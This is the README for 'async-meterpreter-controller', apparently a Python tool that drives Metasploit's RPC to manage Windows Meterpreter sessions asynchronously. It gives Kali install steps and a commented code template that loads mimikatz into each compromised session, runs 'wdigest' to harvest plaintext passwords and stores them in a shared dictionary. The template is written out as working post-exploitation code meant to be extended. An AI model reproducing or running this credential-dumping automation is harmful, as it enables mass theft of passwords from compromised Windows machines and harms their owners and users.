async-meterpreter-controller
------
Waits for a windows meterpreter shell then lets you asynchronously do whatever you want with it.

#### Installation
This install is only tested on Kali. Clone into the repo, enter the cloned folder and run install.sh. Open a new terminal and start metasploit with the included rc file. Back in the original terminal continue by entering the newly-created virtual environment with pipenv. Finally, enter the included msfrpc/ folder and install it now that you're inside the virtual environment.

```
git clone https://github.com/DanMcInerney/async-meterpreter-controller
cd async-meterpreter-controller
In a new terminal: msfconsole -r msfrpc.rc
pipenv install --three
pipenv shell
cd msfrpc && python2 setup install && cd ..
./async-meterpreter-controller.py
```

#### Usage
```./async-meterpreter-controller.py```

#### How to extend
By default all the script does is run `sysinfo`, `getuid`, and windows/post/gather/win_privs then prints all the shell info to the console. All session data is being stored in the global NEW_SESS_DATA dictionary. To extend the template and send commands and get output from each meterpreter session you'll want to go to line 470. Here's an example of how you'd run mimikatz on each session. Start coding on line 472:

```
global NEW_SESS_DATA
load_mimi_cmd = 'load mimikatz'
load_mimi_end_strs = [b'Success.', b'has already been loaded.']
load_mimi_output = await run_session_cmd(client, sess_num, load_mimi_cmd, load_mimi_end_strs)
wdigest_cmd = 'wdigest'
wdigest_end_str = [b'  Password']
mimikatz_output = await run_session_cmd(client, sess_num, wdigest_cmd, wdigest_end_str)
if type(mimikatz_output) == str:
    return mimikatz_output
else:
    mimikatz_utf8_out = mimikatz_output.decode('utf8')
    mimikatz_split = mimikatz_utf8_out.splitlines()
    for l in mimikatz_split:
        print_info(l.strip(), sess_num)
        NEW_SESS_DATA[sess_num][b'mimikatz_output'] = mimikatz_split
```
* Line 1: We will be adding data to NEW_SESS_DATA so that all async coroutines can access the same information about the sessions so we have to define it as a global variable.
* Line 2: We start by creating the command to load the mimikatz plugin in the session.
* Line 3: The script asynchronously waits for the meterpreter output but it's just reading the meterpreter buffer over and over so we give it any number of byte literals to look for that will tell it the command finished. There's also builtin ability to detect timed out commands and various errors.
* Line 4: This is where we call the meterpreter command on that session and asynchronously wait for the output.
* Line 5: Command to run on the session.
* Line 6: The byte literal that will appear in the meterpreter output that tells us the command finished.
* Line 7: Asynchronously wait on the output of the 'wdigest' command.
* Line 8: run_session_cmd() will only return a string if it errored out. Otherwise it will return bytes, e.g., b'Blah blah'. 
* Line 9: Here we return the function with the error message if it errored out.
* Line 10: If we get a byte literal then we know the command completed successfully.
* Line 11: Convert the byte literal to string.
* Line 12: Create a list where each item is one line from the output of the 'wdigest' command.
* Line 13: For each line of output from 'wdigest'...
* Line 14: Print that line of output. We have access to print_info(), print_good(), print_great(), and print_error() which will colorize the output. 
* Line 15: Add the mimikatz data to the global variable NEW_SESS_DATA so that this data is now accessible should you want to do something with it later even if it's in another session.
